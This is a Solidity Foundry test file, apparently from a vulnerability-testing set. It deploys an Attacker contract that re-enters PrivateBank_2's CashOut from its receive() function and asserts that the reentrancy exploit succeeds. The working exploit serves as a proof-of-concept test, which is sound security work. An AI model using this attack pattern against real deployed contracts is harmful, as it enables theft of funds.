
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/PrivateBank_2.sol";

contract TestReentrancyPrivateBank_2 is Test {

    PrivateBank_2 public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        Log transferLog = new Log();
        _contractUnderTest = new PrivateBank_2(address(transferLog));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max / 2);
        

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateBank_2 public bank;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 storedVal;
    uint256 balanceDuringReentry;

    constructor(address victimAddress) { 
        bank = PrivateBank_2(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        storedVal = val;
        bank.Deposit{value: val}();
        bank.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = bank.balances(address(this));

        bank.CashOut(val);

        if (attackCallCount == 2 && balanceDuringReentry == initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            balanceDuringReentry = bank.balances(address(this));
            bank.CashOut(storedVal);
            attackCallCount++;
        }
    }
}
